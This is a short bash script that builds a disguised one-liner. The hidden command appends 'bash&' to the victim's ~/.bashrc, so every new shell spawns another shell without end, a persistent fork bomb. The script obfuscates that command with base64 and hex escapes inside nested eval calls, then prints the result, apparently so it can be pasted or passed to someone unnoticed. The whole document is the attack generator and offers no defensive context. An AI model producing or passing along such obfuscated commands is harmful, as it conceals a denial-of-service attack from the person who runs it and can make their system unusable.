#!/bin/bash

CMD="echo bash\&>>~/.bashrc&&echo ciao"


B64=$(echo -n $CMD | base64)
MIDDLE="eval \`echo \"$B64\" | base64 -d\`"

CODE=$(echo -n $MIDDLE | hexdump -e '"\\\x" 1/1 "%02x"')
LOL="eval \`echo -e \"$CODE\"\`"

echo $LOL
